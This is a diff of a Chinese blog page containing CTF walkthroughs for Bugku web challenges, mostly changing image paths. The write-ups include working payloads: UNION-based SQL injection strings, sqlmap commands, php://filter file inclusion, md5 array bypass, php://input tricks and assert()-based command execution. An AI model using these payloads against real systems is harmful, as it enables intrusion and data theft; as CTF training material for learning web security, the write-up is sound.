@@ -56,20 +56,20 @@
         </div>
         <div class="content markdown">
             <h1 id="web11：（御剑扫描后端）"><a href="#web11：（御剑扫描后端）" class="headerlink" title="web11：（御剑扫描后端）"></a>web11：（御剑扫描后端）</h1><p> 这题的题目是：网站被黑了 黑客会不会留下后门</p>
-<p>那么我们要借助御剑这个后门扫描工具，扫描目标网站，发现有个shell.php文件<img src="/2021/03/16/bugku1/1.png" alt="1"></p>
-<p>访问shell.php<img src="/2021/03/16/bugku1/2.png" alt="2"></p>
+<p>那么我们要借助御剑这个后门扫描工具，扫描目标网站，发现有个shell.php文件<img src="/bugku/1.png" alt="1"></p>
+<p>访问shell.php<img src="/bugku/2.png" alt="2"></p>
 <p>用bp抓包爆破可知密码为<code>hack</code></p>
-<p><img src="/2021/03/16/bugku1/3.png" alt="3"></p>
-<p>pass为hack，登入<img src="/2021/03/16/bugku1/4.png" alt="4"></p>
+<p><img src="/bugku/3.png" alt="3"></p>
+<p>pass为hack，登入<img src="/bugku/4.png" alt="4"></p>
 <h1 id="web13：（url解码）"><a href="#web13：（url解码）" class="headerlink" title="web13：（url解码）"></a>web13：（url解码）</h1><p>题目叫我们看看源码，我们看看源码：</p>
-<p><img src="/2021/03/16/bugku1/5.png" alt="5"></p>
+<p><img src="/bugku/5.png" alt="5"></p>
 <p>我们对其url解码：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkSubmit</span>(<span class="params"></span>)</span>&#123;<span class="keyword">var</span> a=document.getElementById(<span class="string">&quot;password&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="string">&quot;undefined&quot;</span>!=typeof a)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">&quot;67d709b2b54aa2aa648cf6e87a7114f1&quot;</span>==a.value)</span><br><span class="line">       <span class="keyword">return</span>!<span class="number">0</span>;</span><br><span class="line">       alert(<span class="string">&quot;Error&quot;</span>);</span><br><span class="line">       a.focus();</span><br><span class="line">       <span class="keyword">return</span>!<span class="number">1</span>&#125;</span><br><span class="line">&#125;</span><br><span class="line">document.getElementById(<span class="string">&quot;levelQuest&quot;</span>).onsubmit=checkSubmit;</span><br></pre></td></tr></table></figure>
 
 <p>提交字符串<code>67d709b2b54aa2aa648cf6e87a7114f1</code></p>
-<p><img src="/2021/03/16/bugku1/6.png" alt="6"></p>
-<h1 id="web14：（文件包含加php-filter）"><a href="#web14：（文件包含加php-filter）" class="headerlink" title="web14：（文件包含加php://filter）"></a>web14：（文件包含加php://filter）</h1><p>进入题目，看到<img src="/2021/03/16/bugku1/15.png" alt="15"></p>
-<p>点击<code>click me？ no</code>跳转<img src="/2021/03/16/bugku1/16.png" alt="16"></p>
+<p><img src="/bugku/6.png" alt="6"></p>
+<h1 id="web14：（文件包含加php-filter）"><a href="#web14：（文件包含加php-filter）" class="headerlink" title="web14：（文件包含加php://filter）"></a>web14：（文件包含加php://filter）</h1><p>进入题目，看到<img src="/bugku/15.png" alt="15"></p>
+<p>点击<code>click me？ no</code>跳转<img src="/bugku/16.png" alt="16"></p>
 <p>发现是文件包含题。</p>
 <ul>
 <li><strong>补充</strong></li>
@@ -79,20 +79,20 @@
 <li><strong>php://filter</strong> 设计用来过滤筛选文件。如果想要读取运行php文件的源码，需要先对该php文件内容base64编码，再传入include函数，这样就不会被认为是php代码，不会执行，会输出文件的base64编码，后续再解码即可获得源码。</li>
 </ol>
 <p>故本题payload为：<code>php://filter/read=convert.base64-encode/resource=index.php</code></p>
-<p><img src="/2021/03/16/bugku1/17.png" alt="17"></p>
-<p>base64解码：<img src="/2021/03/16/bugku1/18.png" alt="18"></p>
+<p><img src="/bugku/17.png" alt="17"></p>
+<p>base64解码：<img src="/bugku/18.png" alt="18"></p>
 <p>参考博客:</p>
 <p><code>https://blog.csdn.net/zpy1998zpy/article/details/80598768</code></p>
 <p><code>https://www.freebuf.com/column/148886.html</code></p>
 <h1 id="web16：（MD5-函数绕过）"><a href="#web16：（MD5-函数绕过）" class="headerlink" title="web16：（MD5()函数绕过）"></a>web16：（MD5()函数绕过）</h1><p>进入环境后发现就一串数字，其他什么也没有，检查网页源码，抓包看回显都没有什么线索，又用御剑扫描网页后台</p>
-<p><img src="/2021/03/16/bugku1/7.png" alt="7"></p>
+<p><img src="/bugku/7.png" alt="7"></p>
 <p>发现一个.bak拓展名（bak这种备份文件在我们平常使用绘图、编程软件时都会默认创建备份文件，如cad文件修改后会产生bak文件，wps、word等文件修改后也都会产生bak备份文件，这样可以保证当源文件不小心被删掉或者出现故障导致无故自动退出时，还可以从bak备份文件继续编辑，减少了不少误操作带来的损失。）的文件，结合描述的信息：备份是个好习惯，我们可以猜测这个.bak拓展名文件应该有东西</p>
-<p>下载文件并打开<img src="/2021/03/16/bugku1/35@%25PWPHHUMJX79WMRZM%5B_5.png" alt="img"></p>
+<p>下载文件并打开<img src="/bugku/35@%25PWPHHUMJX79WMRZM%5B_5.png" alt="img"></p>
 <p>我们可以看到key1和key2本身不能相等，但是被md5编码后两者要相等才能得到flag。</p>
 <p>总的来说这是一道文件包含漏洞+绕过字符串过滤+绕过md5编码的题</p>
 <p>我们用双写绕过字符串过滤，利用md5()函数无法处理数组（如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL,也就是相等的。）达成if条件。</p>
 <p>因此我们的payload是<code>?kekeyy1[]=1&amp;kekeyy2[]=2</code></p>
-<p><img src="/2021/03/16/bugku1/8.png" alt="8"></p>
+<p><img src="/bugku/8.png" alt="8"></p>
 <h1 id="web17-sql注入——post型"><a href="#web17-sql注入——post型" class="headerlink" title="web17:(sql注入——post型)"></a>web17:(sql注入——post型)</h1><h3 id="1-手工注入："><a href="#1-手工注入：" class="headerlink" title="1.手工注入："></a>1.手工注入：</h3><p>查数字段值：0’ union select 1,2,3,4#</p>
 <p>爆库：0’ union select 1,2,3,database()#</p>
 <p>爆表：0’ union select 1,2,3,group_concat(table_name) from information_schema.talbes where table_schema=’skctf’#</p>
@@ -103,25 +103,25 @@
 <p>爆列：<code>sqlmap.py -u &quot;http://114.67.246.176:12115&quot; --batch --data &quot;id=1&quot; -D skctf -T fl4g --columns</code></p>
 <p>爆值：<code>sqlmap.py -u &quot;http://114.67.246.176:12115&quot; --batch --data &quot;id=1&quot; -D skctf -T fl4g -C skctf_flag --dump </code></p>
 <h1 id="Web20（line控制返回内容）"><a href="#Web20（line控制返回内容）" class="headerlink" title="Web20（line控制返回内容）"></a>Web20（line控制返回内容）</h1><p>打开题目地址发现是一堆乱码，我还以为乱码里面有内容，分析了一通，结果什么也没有。</p>
-<p>注意到url栏filename的值好像被编码了，base64解码得keys.txt。<img src="/2021/03/16/bugku1/12.png" alt="12"></p>
+<p>注意到url栏filename的值好像被编码了，base64解码得keys.txt。<img src="/bugku/12.png" alt="12"></p>
 <ul>
 <li>变量line的值为多少就返回指定文件中第几行，无值时默认返回第0行</li>
 </ul>
 <p>一般index.php都会存在源码，编码index.php</p>
-<p><img src="/2021/03/16/bugku1/13.png" alt="13"></p>
+<p><img src="/bugku/13.png" alt="13"></p>
 <p>返回index.php第一行源码，只要不断更改line的值最终就可以获得完整的index.php源码（因为我不会写python脚本）</p>
 <p>index.php源码：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$file=base64_decode(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;filename&#x27;</span>])?$_GET[<span class="string">&#x27;filename&#x27;</span>]:<span class="string">&quot;&quot;</span>);</span><br><span class="line">$line=<span class="keyword">isset</span>($_GET[<span class="string">&#x27;line&#x27;</span>])?intval($_GET[<span class="string">&#x27;line&#x27;</span>]):<span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>($file==<span class="string">&#x27;&#x27;</span>) header(<span class="string">&quot;location:index.php?line=&amp;filename=a2V5cy50eHQ=&quot;</span>);</span><br><span class="line">$file_list = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;0&#x27;</span> =&gt;<span class="string">&#x27;keys.txt&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;1&#x27;</span> =&gt;<span class="string">&#x27;index.php&#x27;</span>,</span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">&#x27;margin&#x27;</span>]) &amp;&amp; $_COOKIE[<span class="string">&#x27;margin&#x27;</span>]==<span class="string">&#x27;margin&#x27;</span>)&#123;</span><br><span class="line">$file_list[<span class="number">2</span>]=<span class="string">&#x27;keys.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(in_array($file, $file_list))&#123;</span><br><span class="line">$fa = file($file);</span><br><span class="line"><span class="keyword">echo</span> $fa[$line];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>我们看到当cookie内容为参数margin=margin时，file_list数组会多一个键值<code>keys.php</code>，然后通过in_array函数检测我们上传的文件名是否在file_list数组中，是则发送key.php文件的内容。</p>
-<p>因此我们构造cookie：margin=margin，令filename的值为key.php  base64编码后的值。<img src="/2021/03/16/bugku1/14.png" alt="14"></p>
-<h1 id="web21：（编码-加条件绕过）"><a href="#web21：（编码-加条件绕过）" class="headerlink" title="web21：（编码+加条件绕过）"></a>web21：（编码+加条件绕过）</h1><p>打开题目地址做的第一件就是查看网页源码<img src="/2021/03/16/bugku1/9.png" alt="9"></p>
+<p>因此我们构造cookie：margin=margin，令filename的值为key.php  base64编码后的值。<img src="/bugku/14.png" alt="14"></p>
+<h1 id="web21：（编码-加条件绕过）"><a href="#web21：（编码-加条件绕过）" class="headerlink" title="web21：（编码+加条件绕过）"></a>web21：（编码+加条件绕过）</h1><p>打开题目地址做的第一件就是查看网页源码<img src="/bugku/9.png" alt="9"></p>
 <p>发现有一个1p.html文件，打开是一段HTML代码</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">HTML</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">HEAD</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span> <span class="attr">LANGUAGE</span>=<span class="string">&quot;Javascript&quot;</span>&gt;</span></span><br><span class="line">&lt;!--</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> Words =<span class="string">&quot;%3Cscript%3Ewindow.location.href%3D&#x27;http%3A%2F%2Fwww.bugku.com&#x27;%3B%3C%2Fscript%3E%20%0A%3C!--JTIyJTNCaWYoISUyNF9HRVQlNUInaWQnJTVEKSUwQSU3QiUwQSUwOWhlYWRlcignTG9jYXRpb24lM0ElMjBoZWxsby5waHAlM0ZpZCUzRDEnKSUzQiUwQSUwOWV4aXQoKSUzQiUwQSU3RCUwQSUyNGlkJTNEJTI0X0dFVCU1QidpZCclNUQlM0IlMEElMjRhJTNEJTI0X0dFVCU1QidhJyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJ2InJTVEJTNCJTBBaWYoc3RyaXBvcyglMjRhJTJDJy4nKSklMEElN0IlMEElMDllY2hvJTIwJ25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJyUzQiUwQSUwOXJldHVybiUyMCUzQiUwQSU3RCUwQSUyNGRhdGElMjAlM0QlMjAlNDBmaWxlX2dldF9jb250ZW50cyglMjRhJTJDJ3InKSUzQiUwQWlmKCUyNGRhdGElM0QlM0QlMjJidWdrdSUyMGlzJTIwYSUyMG5pY2UlMjBwbGF0ZWZvcm0hJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuKCUyNGIpJTNFNSUyMGFuZCUyMGVyZWdpKCUyMjExMSUyMi5zdWJzdHIoJTI0YiUyQzAlMkMxKSUyQyUyMjExMTQlMjIpJTIwYW5kJTIwc3Vic3RyKCUyNGIlMkMwJTJDMSkhJTNENCklMEElN0IlMEElMDklMjRmbGFnJTIwJTNEJTIwJTIyZmxhZyU3QioqKioqKioqKioqJTdEJTIyJTBBJTdEJTBBZWxzZSUwQSU3QiUwQSUwOXByaW50JTIwJTIybmV2ZXIlMjBuZXZlciUyMG5ldmVyJTIwZ2l2ZSUyMHVwJTIwISEhJTIyJTNCJTBBJTdEJTBBJTBBJTBBJTNGJTNF--%3E&quot;</span> </span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">OutWord</span>(<span class="params"></span>)</span></span></span><br><span class="line">&#123;</span><br><span class="line"><span class="javascript"><span class="keyword">var</span> NewWords;</span></span><br><span class="line"><span class="javascript">NewWords = <span class="built_in">unescape</span>(Words);</span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.write(NewWords);</span></span><br><span class="line">&#125; </span><br><span class="line">OutWord();</span><br><span class="line"><span class="javascript"><span class="comment">// --&gt;</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">HEAD</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">BODY</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">BODY</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">HTML</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>我们看到word一大串字符串很可疑，结合后面的unescape()函数，断定这里被编码了</p>
 <p>用burp解码，顺序为：url解码，base64解码，再url解码</p>
-<p><img src="/2021/03/16/bugku1/10.png" alt="10"></p>
+<p><img src="/bugku/10.png" alt="10"></p>
 <p>最终得</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--<span class="string">&quot;;if(!<span class="subst">$_GET</span>[&#x27;id&#x27;])</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">	header(&#x27;Location: hello.php?id=1&#x27;);</span></span><br><span class="line"><span class="string">	exit();</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"><span class="subst">$id</span>=<span class="subst">$_GET</span>[&#x27;id&#x27;];</span></span><br><span class="line"><span class="string"><span class="subst">$a</span>=<span class="subst">$_GET</span>[&#x27;a&#x27;];</span></span><br><span class="line"><span class="string"><span class="subst">$b</span>=<span class="subst">$_GET</span>[&#x27;b&#x27;];</span></span><br><span class="line"><span class="string">if(stripos(<span class="subst">$a</span>,&#x27;.&#x27;))</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">	echo &#x27;no no no no no no no&#x27;;</span></span><br><span class="line"><span class="string">	return ;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"><span class="subst">$data</span> = @file_get_contents(<span class="subst">$a</span>,&#x27;r&#x27;);</span></span><br><span class="line"><span class="string">if(<span class="subst">$data</span>==&quot;</span>bugku is a nice plateform!<span class="string">&quot; and <span class="subst">$id</span>==0 and strlen(<span class="subst">$b</span>)&gt;5 and eregi(&quot;</span><span class="number">111</span><span class="string">&quot;.substr(<span class="subst">$b</span>,0,1),&quot;</span><span class="number">1114</span><span class="string">&quot;) and substr(<span class="subst">$b</span>,0,1)!=4)</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">	<span class="subst">$flag</span> = &quot;</span>flag&#123;***********&#125;<span class="string">&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">else</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">	print &quot;</span>never never never give up !!!<span class="string">&quot;;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?&gt;--&gt;</span></span><br></pre></td></tr></table></figure>
 
@@ -139,7 +139,7 @@
 <p>由于if条件规定：data的值为<code>bugku is a nice plateform!</code>因此我们可以利用php://input获取post上传数据的特点，</p>
 <p>令<code>?a=php://input</code>并post数据<code>bugku is a nice plateform!</code></p>
 <p>综上所述：payload=?id=0e1&amp;a=php://input&amp;b=%0023456 并post数据<code>bugku is a nice plateform!</code></p>
-<p><img src="/2021/03/16/bugku1/11.png" alt="11"></p>
+<p><img src="/bugku/11.png" alt="11"></p>
 <h1 id="web22（assert-函数漏洞利用）"><a href="#web22（assert-函数漏洞利用）" class="headerlink" title="web22（assert()函数漏洞利用）"></a>web22（assert()函数漏洞利用）</h1><p>点开题目发现题目描述那段话：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$poc&#x3D;&quot;a#s#s#e#r#t&quot;; </span><br><span class="line">$poc_1&#x3D;explode(&quot;#&quot;,$poc);  </span><br><span class="line">$poc_2&#x3D;$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5];  </span><br><span class="line">$poc_2($_GET[&#39;s&#39;])</span><br></pre></td></tr></table></figure>
 
@@ -147,9 +147,9 @@
 <p>补充：assert()函数会将括号内的字符串当作php代码执行。</p>
 <p>详情参考：<code>https://www.smi1e.top/%E6%B5%85%E8%B0%88eval%E5%92%8Cassert/</code></p>
 <p>那么我们可以根据assert()函数的特性，构造payload：<code>?s=system(ls)或?s=system(dir)</code></p>
-<p><img src="/2021/03/16/bugku1/19.png" alt="19"></p>
+<p><img src="/bugku/19.png" alt="19"></p>
 <p>访问<code>flaga15808abee46a1d5.txt</code>，得flag</p>
-<h1 id="web23：（正则表达式）"><a href="#web23：（正则表达式）" class="headerlink" title="web23：（正则表达式）"></a>web23：（正则表达式）</h1><p>打开题目地址：<img src="/2021/03/16/bugku1/21.png" alt="21"></p>
+<h1 id="web23：（正则表达式）"><a href="#web23：（正则表达式）" class="headerlink" title="web23：（正则表达式）"></a>web23：（正则表达式）</h1><p>打开题目地址：<img src="/bugku/21.png" alt="21"></p>
 <p>我们看到一个正则表达式：<code>/key.*key.&#123;4,7&#125;key:\/.\/(.*key)[a-z][[:punct:]]/i</code>，当我们输入的id值满足正则匹配是会输出flag</p>
 <p>我们可以把这个正则表达式拆分成：<code>key</code> <code>.</code> <code>*</code> <code>key</code> <code>.&#123;4,7&#125;</code> <code>key</code> <code>:</code> <code>/</code> <code>.</code> <code>/</code> <code>.</code> <code>*</code> <code>key</code> <code>[a-z]</code> <code>[[:punct:]]</code></p>
 <p>分析（从左到右）：</p>
@@ -169,8 +169,8 @@
 <p><code>[a-z]</code>——匹配a-z之间的字母</p>
 <p><code>[[:punct:]]</code>——匹配任意标点符号</p>
 <p>依次我们构造payload，以get的方式传参id：<code>?id=key1key1111key:/1/1keya!</code>     （payload不唯一）</p>
-<h1 id="web24：（md5绕过-strcmp函数绕过）"><a href="#web24：（md5绕过-strcmp函数绕过）" class="headerlink" title="web24：（md5绕过+strcmp函数绕过）"></a>web24：（md5绕过+strcmp函数绕过）</h1><p>打开题目地址，查看源码：<img src="/2021/03/16/bugku1/Users/Lenovo\Desktop\blog\hexo\source_posts\bugku\22.png" alt="22"></p>
-<p>点开code.txt<img src="/2021/03/16/bugku1/Users/Lenovo\Desktop\blog\hexo\source_posts\bugku\23.png" alt="23"></p>
+<h1 id="web24：（md5绕过-strcmp函数绕过）"><a href="#web24：（md5绕过-strcmp函数绕过）" class="headerlink" title="web24：（md5绕过+strcmp函数绕过）"></a>web24：（md5绕过+strcmp函数绕过）</h1><p>打开题目地址，查看源码：<img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\bugku\22.png" alt="22"></p>
+<p>点开code.txt<img src="/C:/Users\Lenovo\Desktop\blog\hexo\source_posts\bugku\23.png" alt="23"></p>
 <p>我们看到有三个参数：v1,v2,v3</p>
 <p>要满足条件：</p>
 <p>1.<code>v1!=v2</code></p>
